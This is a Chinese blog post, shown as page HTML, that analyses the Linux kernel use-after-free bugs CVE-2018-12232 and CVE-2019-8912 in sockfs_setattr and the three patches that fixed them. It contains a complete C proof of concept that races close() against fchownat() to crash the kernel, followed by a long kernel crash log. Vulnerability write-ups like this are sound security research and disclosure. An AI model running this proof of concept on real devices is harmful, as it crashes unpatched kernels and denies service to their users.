<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="Let_go"><meta name="renderer" content="webkit"><meta name="copyright" content="Let_go"><meta name="keywords" content="Let_go"><meta name="description" content="null"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>CVE-2018-12232-And-CVE-2019-8912 · Mr.Chen's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Let_go</div><div class="profile-signature">人生如棋,我愿为卒。行动虽慢,可谁曾见我后退一步。</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Chen's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about">About</a><a href="/archives">Archives</a><a href="/tags">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about">About</a><a href="/archives">Archives</a><a href="/tags">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">CVE-2018-12232-And-CVE-2019-8912</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019/04/03</span></span><span class="busuanzi-pv" id="busuanzi_container_page_pv"><i class="post-intro-calendar fa fa-user-o"></i><span id="busuanzi_value_page_pv"></span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="Android_Kernel"> Android_Kernel</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="CVE-2018-12232-amp-amp-CVE-2019-8912"><a href="#CVE-2018-12232-amp-amp-CVE-2019-8912" class="headerlink" title="CVE-2018-12232&amp;&amp;CVE-2019-8912"></a>CVE-2018-12232&amp;&amp;CVE-2019-8912</h1><hr>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><ul>
<li>实验环境：Android-&gt; MiX2</li>
<li>漏洞类型：条件竞争 -&gt; 释放后重引用</li>
<li>linux补丁：<ul>
<li>CVE-2018-12232:<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6d8c50dcb029872b298eea68cc6209c866fd3e14(第一次修补" target="_blank" rel="external">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6d8c50dcb029872b298eea68cc6209c866fd3e14(第一次修补</a>)</li>
<li>CVE-2019-8912:<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9060cb719e61b685ec0102574e10337fa5f445ea(第二次修补" target="_blank" rel="external">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9060cb719e61b685ec0102574e10337fa5f445ea(第二次修补</a>)</li>
<li>CVE-2019-8912:<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ff7b11aa481f682e0e9711abfeb7d03f5cd612bf(第三次修补" target="_blank" rel="external">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ff7b11aa481f682e0e9711abfeb7d03f5cd612bf(第三次修补</a>)</li>
</ul>
</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>这里简单记录一下今天看的两个漏洞(CVE-2018-12232和CVE-2019-8912),挺有意思的两个洞，CVE-2018-12232这个漏洞的原理就是由于竞争条件导致close释放了sk后没有把sk设置为null，在sockfs_setattr函数中直接把sock-&gt;sk拿来使用导致的释放后重引用问题。而第二个洞(CVE-2019-8912)则是由于在修补第一个洞(CVE-2018-12232)时考虑不周导致的修复不彻底可以绕过第一次的修复的二次修复。</p>
<h3 id="漏洞造成的影响"><a href="#漏洞造成的影响" class="headerlink" title="漏洞造成的影响"></a>漏洞造成的影响</h3><p>通过条件竞争触发释放后重引用达到内核态NULL指针解引用实现拒绝服务攻击</p>
<h3 id="补丁用意"><a href="#补丁用意" class="headerlink" title="补丁用意"></a>补丁用意</h3><p>Linux补丁是2018年6月份的时候对该漏洞打上的补丁，补丁主要是在sockfs_setattr函数中添加了对sock-&gt;sk是否为NULL的检查，因为通常release函数中释放完sk内存后都把sock-&gt;sk设置为NULL，所以我们在sockfs_setattr中判断一下是否为NULL就可避免别的线程通过release函数竞争释放掉sock-&gt;sk内存后触发的释放后重引用问题，可惜的是这次的修补并不能算是一个成功的修补。这就引出了第二次修补，其实第二次修补从时间来看也分为两次，第一次是2019年2月18日只是单独在crypto模块的af_alg_release函数中把sock-&gt;sk置为NULL避免了AF_ALG套接字的UAF，但是后来发现这样修补并没有从根本上解决问题，因为还有许多模块的release函数也存在没把sock-&gt;sk置为NULL的问题，所以2019年2月25日再次进行修补，这次修补是直接在调用完release函数之后把sock-&gt;sk置为NULL，这样才从根本上解决了sock-&gt;sk内存释放后没置为NULL引发的NULL指针解引用问题。</p>
<h3 id="漏洞模型"><a href="#漏洞模型" class="headerlink" title="漏洞模型"></a>漏洞模型</h3><p>释放内存后未对指针变量置为NULL，由于别的地方对该指针还有引用并且使用时还没有判断指针是否为NULL，从而触发了释放后重引用问题，很标准的释放后重引用模型。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">pthread_t</span> t;</div><div class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> fd;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">close_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>&#123;</div><div class="line">    <span class="keyword">for</span> (;;) &#123;</div><div class="line">        close(fd);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">setattr_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>&#123;</div><div class="line">    <span class="keyword">for</span> (;;) &#123;</div><div class="line">		<span class="keyword">if</span>(fchownat(fd, <span class="string">""</span>, <span class="number">2000</span>, <span class="number">2000</span>, <span class="number">0x1000</span>) == <span class="number">-1</span>)&#123;</div><div class="line">			<span class="comment">//perror("&gt; ");</span></div><div class="line">		&#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    pthread_create(&amp;t, <span class="literal">NULL</span>, close_thread, <span class="literal">NULL</span>);</div><div class="line">	pthread_create(&amp;t, <span class="literal">NULL</span>, setattr_thread, <span class="literal">NULL</span>);</div><div class="line">    <span class="keyword">for</span> (;;) &#123;</div><div class="line">        fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</div><div class="line">        <span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</div><div class="line">			perror(<span class="string">"&gt; "</span>);</div><div class="line">		&#125;</div><div class="line">        close(fd);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Crash-Log"><a href="#Crash-Log" class="headerlink" title="Crash Log"></a>Crash Log</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div></pre></td><td class="code"><pre><div class="line">[<span class="number">25032.287867</span>] FG: soc_work_fn: adjust_soc: <span class="number">079</span>: <span class="number">00</span>, <span class="number">00</span>, <span class="number">00</span>, <span class="number">03</span></div><div class="line">[<span class="number">25032.946282</span>] Unable to handle kernel <span class="literal">NULL</span> pointer dereference at <span class="keyword">virtual</span> address <span class="number">0000025</span>c</div><div class="line">[<span class="number">25032.946349</span>] pgd = ffffffc092f0f000</div><div class="line">[<span class="number">25032.946364</span>] [<span class="number">0000025</span>c] *pgd=<span class="number">00000000f</span>0737003, *pud=<span class="number">00000000f</span>0737003, *pmd=<span class="number">0000000000000000</span></div><div class="line">[<span class="number">25032.946601</span>] ------------[ cut here ]------------</div><div class="line">[<span class="number">25032.946618</span>] Kernel BUG at ffffff8008cc2284 [verbose debug info unavailable]</div><div class="line">[<span class="number">25032.946636</span>] Internal error: Oops - BUG: <span class="number">96000046</span> [#<span class="number">1</span>] PREEMPT SMP</div><div class="line">[<span class="number">25032.946653</span>] Modules linked in: wlan(O) exfat(O)</div><div class="line">[<span class="number">25032.946707</span>] CPU: <span class="number">2</span> PID: <span class="number">9620</span> Comm: poc Tainted: G        W  O    <span class="number">4.4</span><span class="number">.78</span>-perf-gdd4cbe9<span class="number">-00529</span>-g1a92c1c #<span class="number">1</span></div><div class="line">[<span class="number">25032.946722</span>] Hardware name: Qualcomm Technologies, Inc. MSM <span class="number">8998</span> v2<span class="number">.1</span> MTP (DT)</div><div class="line">[<span class="number">25032.946743</span>] task: ffffffc0a2ca3000 ti: ffffffc0a41fc000 task.ti: ffffffc0a41fc000</div><div class="line">[<span class="number">25032.946789</span>] PC is at sockfs_setattr+<span class="number">0x30</span>/<span class="number">0x40</span></div><div class="line">[<span class="number">25032.946809</span>] LR is at sockfs_setattr+<span class="number">0x18</span>/<span class="number">0x40</span></div><div class="line">[<span class="number">25032.946826</span>] pc : [&lt;ffffff8008cc2284&gt;] lr : [&lt;ffffff8008cc226c&gt;] pstate: <span class="number">20000145</span></div><div class="line">[<span class="number">25032.946839</span>] sp : ffffffc0a41ffd40</div><div class="line">[<span class="number">25032.946852</span>] x29: ffffffc0a41ffd40 x28: ffffffc0a41fc000</div><div class="line">[<span class="number">25032.946877</span>] x27: <span class="number">0000000000005800</span> x26: <span class="number">000000000000</span>c1ff</div><div class="line">[<span class="number">25032.946901</span>] x25: ffffffc0a41ffe18 x24: ffffffc174cf43a0</div><div class="line">[<span class="number">25032.946924</span>] x23: ffffffc0ac9c6840 x22: ffffffc0a41ffe20</div><div class="line">[<span class="number">25032.946948</span>] x21: ffffffc0a134d430 x20: ffffffc0ac9c6840</div><div class="line">[<span class="number">25032.946972</span>] x19: ffffffc0a41ffe20 x18: <span class="number">0000000000000000</span></div><div class="line">[<span class="number">25032.946995</span>] x17: <span class="number">0000000000000001</span> x16: ffffff80081b6598</div><div class="line">[<span class="number">25032.947019</span>] x15: <span class="number">0000007f</span>e17f3aa8 x14: <span class="number">0000000000000001</span></div><div class="line">[<span class="number">25032.947042</span>] x13: <span class="number">0000000000000001</span> x12: <span class="number">0000000000000003</span></div><div class="line">[<span class="number">25032.947066</span>] x11: <span class="number">0101010101010101</span> x10: fffffffffffffffd</div><div class="line">[<span class="number">25032.947088</span>] x9 : <span class="number">0000000000000005</span> x8 : <span class="number">0000000000000002</span></div><div class="line">[<span class="number">25032.947111</span>] x7 : <span class="number">00000000003</span>ceaa4 x6 : <span class="number">0000004173</span>d33000</div><div class="line">[<span class="number">25032.947134</span>] x5 : <span class="number">0000000000000000</span> x4 : <span class="number">0000000000000000</span></div><div class="line">[<span class="number">25032.947159</span>] x3 : <span class="number">0000000000000000</span> x2 : <span class="number">00000000000007</span>d0</div><div class="line">[<span class="number">25032.947182</span>] x1 : <span class="number">0000000000000000</span> x0 : <span class="number">0000000000000000</span></div><div class="line">[<span class="number">25032.947209</span>]</div><div class="line">[<span class="number">25032.947209</span>] PC: <span class="number">0xffffff8008cc2184</span>:</div><div class="line">[<span class="number">25032.947225</span>] <span class="number">2184</span>  <span class="number">36580062</span> <span class="number">52800802</span> b90073a2 f9400402 <span class="number">92800380</span> b5000202 f9400822 d2800000</div><div class="line">[<span class="number">25032.947294</span>] <span class="number">21</span>a4  b40001a2 b94073a3 aa0103f3 aa0403e0 aa1403e1 <span class="number">97f</span>fffcd <span class="number">93407</span>c00 a9410e82</div><div class="line">[<span class="number">25032.947359</span>] <span class="number">21</span>c4  a9000e62 f9401a81 a9420e82 a9010e62 f9001261 a94153f3 a8c87bfd d65f03c0</div><div class="line">[<span class="number">25032.947424</span>] <span class="number">21e4</span>  a9bb7bfd <span class="number">910003f</span>d a90153f3 a9025bf5 f9001bf7 aa0103f4 aa0003f7 <span class="number">91004020</span></div><div class="line">[<span class="number">25032.947489</span>] <span class="number">2204</span>  <span class="number">52800041</span> aa0403f6 d5384113 f90027a5 f9400675 <span class="number">97</span>dac853 <span class="number">92800000</span> f9000660</div><div class="line">[<span class="number">25032.947555</span>] <span class="number">2224</span>  f94027a5 aa1703e0 aa1403e1 aa1603e2 <span class="number">2</span>a0503e3 <span class="number">97f</span>fffad f9000675 a94153f3</div><div class="line">[<span class="number">25032.947619</span>] <span class="number">2244</span>  a9425bf5 f9401bf7 a8c57bfd d65f03c0 a9be7bfd <span class="number">910003f</span>d a90153f3 aa0003f4</div><div class="line">[<span class="number">25032.947682</span>] <span class="number">2264</span>  aa0103f3 <span class="number">97</span>d45e34 <span class="number">350000e0</span> b9400261 <span class="number">360800</span>a1 f9401a81 b9400a62 f85f0021</div><div class="line">[<span class="number">25032.947748</span>] <span class="number">2284</span>  b9025c22 a94153f3 a8c27bfd d65f03c0 a9bd7bfd <span class="number">910003f</span>d a90153f3 a9025bf5</div><div class="line">[<span class="number">25032.947814</span>] <span class="number">22</span>a4  <span class="number">2</span>a0203f6 aa0103f3 f9401002 aa0003f5 aa1303e3 <span class="number">79402040</span> <span class="number">79429441</span> <span class="number">39452442</span></div><div class="line">[<span class="number">25032.947876</span>] <span class="number">22</span>c4  <span class="number">97f</span>ffcfa <span class="number">2</span>a0003f4 <span class="number">37f</span>80294 f94016a0 <span class="number">2</span>a1603e2 f9400261 f9401803 aa1503e0</div><div class="line">[<span class="number">25032.947942</span>] <span class="number">22e4</span>  d63f0060 <span class="number">2</span>a0003f4 <span class="number">36f</span>800b4 f9400260 <span class="number">97f</span>ffc0d f900027f <span class="number">14000008</span> f9400260</div><div class="line">[<span class="number">25032.948009</span>] <span class="number">2304</span>  f94016a1 f9001401 f9400260 f9401400 f9400400 <span class="number">97</span>d16f06 <span class="number">2</span>a1403e0 a94153f3</div><div class="line">[<span class="number">25032.948074</span>] <span class="number">2324</span>  a9425bf5 a8c37bfd d65f03c0 a9be7bfd <span class="number">7100</span>a01f <span class="number">910003f</span>d a90153f3 <span class="number">54000049</span></div><div class="line">[<span class="number">25032.948140</span>] <span class="number">2344</span>  d4210000 <span class="number">9000b</span>7b3 <span class="number">2</span>a0003f4 <span class="number">911b</span>0273 <span class="number">91008273</span> aa1303e0 <span class="number">9407f</span>3ad d0007a20</div><div class="line">[<span class="number">25032.948203</span>] <span class="number">2364</span>  <span class="number">937</span>d7e81 <span class="number">91352000</span> <span class="number">91002000</span> f821681f aa1303e0 <span class="number">9407f</span>433 <span class="number">97</span>d1076f d0005b60</div><div class="line">[<span class="number">25032.948272</span>]</div><div class="line">[<span class="number">25032.948272</span>] LR: <span class="number">0xffffff8008cc216c</span>:</div><div class="line">[<span class="number">25032.948287</span>] <span class="number">216</span>c  a9047e9f a9021e86 f9001a85 f9003fa0 f9406844 b9404042 <span class="number">36580062</span> <span class="number">52800802</span></div><div class="line">[<span class="number">25032.948354</span>] <span class="number">218</span>c  b90073a2 f9400402 <span class="number">92800380</span> b5000202 f9400822 d2800000 b40001a2 b94073a3</div><div class="line">[<span class="number">25032.948418</span>] <span class="number">21</span>ac  aa0103f3 aa0403e0 aa1403e1 <span class="number">97f</span>fffcd <span class="number">93407</span>c00 a9410e82 a9000e62 f9401a81</div><div class="line">[<span class="number">25032.948481</span>] <span class="number">21</span>cc  a9420e82 a9010e62 f9001261 a94153f3 a8c87bfd d65f03c0 a9bb7bfd <span class="number">910003f</span>d</div><div class="line">[<span class="number">25032.948544</span>] <span class="number">21</span>ec  a90153f3 a9025bf5 f9001bf7 aa0103f4 aa0003f7 <span class="number">91004020</span> <span class="number">52800041</span> aa0403f6</div><div class="line">[<span class="number">25032.948609</span>] <span class="number">220</span>c  d5384113 f90027a5 f9400675 <span class="number">97</span>dac853 <span class="number">92800000</span> f9000660 f94027a5 aa1703e0</div><div class="line">[<span class="number">25032.948676</span>] <span class="number">222</span>c  aa1403e1 aa1603e2 <span class="number">2</span>a0503e3 <span class="number">97f</span>fffad f9000675 a94153f3 a9425bf5 f9401bf7</div><div class="line">[<span class="number">25032.948741</span>] <span class="number">224</span>c  a8c57bfd d65f03c0 a9be7bfd <span class="number">910003f</span>d a90153f3 aa0003f4 aa0103f3 <span class="number">97</span>d45e34</div><div class="line">[<span class="number">25032.948806</span>] <span class="number">226</span>c  <span class="number">350000e0</span> b9400261 <span class="number">360800</span>a1 f9401a81 b9400a62 f85f0021 b9025c22 a94153f3</div><div class="line">[<span class="number">25032.948869</span>] <span class="number">228</span>c  a8c27bfd d65f03c0 a9bd7bfd <span class="number">910003f</span>d a90153f3 a9025bf5 <span class="number">2</span>a0203f6 aa0103f3</div><div class="line">[<span class="number">25032.948934</span>] <span class="number">22</span>ac  f9401002 aa0003f5 aa1303e3 <span class="number">79402040</span> <span class="number">79429441</span> <span class="number">39452442</span> <span class="number">97f</span>ffcfa <span class="number">2</span>a0003f4</div><div class="line">[<span class="number">25032.949000</span>] <span class="number">22</span>cc  <span class="number">37f</span>80294 f94016a0 <span class="number">2</span>a1603e2 f9400261 f9401803 aa1503e0 d63f0060 <span class="number">2</span>a0003f4</div><div class="line">[<span class="number">25032.949065</span>] <span class="number">22</span>ec  <span class="number">36f</span>800b4 f9400260 <span class="number">97f</span>ffc0d f900027f <span class="number">14000008</span> f9400260 f94016a1 f9001401</div><div class="line">[<span class="number">25032.949129</span>] <span class="number">230</span>c  f9400260 f9401400 f9400400 <span class="number">97</span>d16f06 <span class="number">2</span>a1403e0 a94153f3 a9425bf5 a8c37bfd</div><div class="line">[<span class="number">25032.949194</span>] <span class="number">232</span>c  d65f03c0 a9be7bfd <span class="number">7100</span>a01f <span class="number">910003f</span>d a90153f3 <span class="number">54000049</span> d4210000 <span class="number">9000b</span>7b3</div><div class="line">[<span class="number">25032.949261</span>] <span class="number">234</span>c  <span class="number">2</span>a0003f4 <span class="number">911b</span>0273 <span class="number">91008273</span> aa1303e0 <span class="number">9407f</span>3ad d0007a20 <span class="number">937</span>d7e81 <span class="number">91352000</span></div><div class="line">[<span class="number">25032.949330</span>]</div><div class="line">[<span class="number">25032.949330</span>] SP: <span class="number">0xffffffc0a41ffc40</span>:</div><div class="line">[<span class="number">25032.949345</span>] fc40  <span class="number">73</span>d33000 <span class="number">00000041</span> <span class="number">003</span>ceaa4 <span class="number">00000000</span> <span class="number">00000002</span> <span class="number">00000000</span> <span class="number">00000005</span> <span class="number">00000000</span></div><div class="line">[<span class="number">25032.949408</span>] fc60  fffffffd ffffffff <span class="number">01010101</span> <span class="number">01010101</span> <span class="number">00000003</span> <span class="number">00000000</span> <span class="number">00000001</span> <span class="number">00000000</span></div><div class="line">[<span class="number">25032.949472</span>] fc80  <span class="number">00000001</span> <span class="number">00000000</span> e17f3aa8 <span class="number">0000007f</span> <span class="number">081b</span>6598 ffffff80 <span class="number">00000001</span> <span class="number">00000000</span></div><div class="line">[<span class="number">25032.949536</span>] fca0  <span class="number">00000000</span> <span class="number">00000000</span> a41ffe20 ffffffc0 ac9c6840 ffffffc0 a134d430 ffffffc0</div><div class="line">[<span class="number">25032.949600</span>] fcc0  a41ffe20 ffffffc0 ac9c6840 ffffffc0 <span class="number">74</span>cf43a0 ffffffc1 a41ffe18 ffffffc0</div><div class="line">[<span class="number">25032.949664</span>] fce0  <span class="number">0000</span>c1ff <span class="number">00000000</span> <span class="number">00005800</span> <span class="number">00000000</span> a41fc000 ffffffc0 a41ffd40 ffffffc0</div><div class="line">[<span class="number">25032.949729</span>] fd00  <span class="number">08</span>cc226c ffffff80 a41ffd40 ffffffc0 <span class="number">08</span>cc2284 ffffff80 <span class="number">20000145</span> <span class="number">00000000</span></div><div class="line">[<span class="number">25032.949796</span>] fd20  a41ffd40 ffffffc0 <span class="number">08</span>cc226c ffffff80 <span class="number">00000000</span> <span class="number">00000080</span> ac9c6840 ffffffc0</div><div class="line">[<span class="number">25032.949861</span>] fd40  a41ffd60 ffffffc0 <span class="number">081</span>cfbe4 ffffff80 <span class="number">00001846</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></div><div class="line">[<span class="number">25032.949927</span>] fd60  a41ffdb0 ffffffc0 <span class="number">081b</span>54b4 ffffff80 <span class="number">00000000</span> <span class="number">00000000</span> a41ffeb0 ffffffc0</div><div class="line">[<span class="number">25032.949990</span>] fd80  a134d430 ffffffc0 <span class="number">000007</span>d0 <span class="number">00000000</span> <span class="number">000007</span>d0 <span class="number">00000000</span> a134d4d8 ffffffc0</div><div class="line">[<span class="number">25032.950055</span>] fda0  <span class="number">00000040</span> <span class="number">00000000</span> <span class="number">00000042</span> <span class="number">00000000</span> a41ffe70 ffffffc0 <span class="number">081b</span>6628 ffffff80</div><div class="line">[<span class="number">25032.950121</span>] fdc0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00004001</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">0042</span>a302 <span class="number">00000000</span></div><div class="line">[<span class="number">25032.950185</span>] fde0  <span class="number">000007</span>d0 <span class="number">00000000</span> <span class="number">000007</span>d0 <span class="number">00000000</span> <span class="number">0000011</span>d <span class="number">00000000</span> <span class="number">00000036</span> <span class="number">00000000</span></div><div class="line">[<span class="number">25032.950251</span>] fe00  <span class="number">09002000</span> ffffff80 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></div><div class="line">[<span class="number">25032.950315</span>] fe20  <span class="number">00001846</span> <span class="number">00000000</span> <span class="number">000007</span>d0 <span class="number">000007</span>d0 a41ffe50 ffffffc0 <span class="number">5</span>a043e06 <span class="number">00000000</span></div><div class="line">[<span class="number">25032.950380</span>]</div><div class="line">[<span class="number">25032.950396</span>] Process poc (pid: <span class="number">9620</span>, <span class="built_in">stack</span> limit = <span class="number">0xffffffc0a41fc020</span>)</div><div class="line">[<span class="number">25032.950412</span>] Call trace:</div><div class="line">[<span class="number">25032.950435</span>] Exception <span class="built_in">stack</span>(<span class="number">0xffffffc0a41ffb70</span> to <span class="number">0xffffffc0a41ffca0</span>)</div><div class="line">[<span class="number">25032.950454</span>] fb60:                                   ffffffc0a41ffe20 <span class="number">0000008000000000</span></div><div class="line">[<span class="number">25032.950476</span>] fb80: ffffffc0a41ffd40 ffffff8008cc2284 ffffffbdc284d300 ffffffc0a134e080</div><div class="line">[<span class="number">25032.950498</span>] fba0: ffffffc174ce2300 ffffff8008cc1d38 ffffffc0a41fc000 ffffffc0a41fc000</div><div class="line">[<span class="number">25032.950521</span>] fbc0: <span class="number">000000000000b</span>f42 ffffff8009007000 ffffff8009002000 ffffffc0a41fc000</div><div class="line">[<span class="number">25032.950542</span>] fbe0: ffffffc0a41ffc00 <span class="number">0000000108146380</span> ffffffc0a134e080 ffffffc0a41fc000</div><div class="line">[<span class="number">25032.950564</span>] fc00: ffffffc0a41ffc60 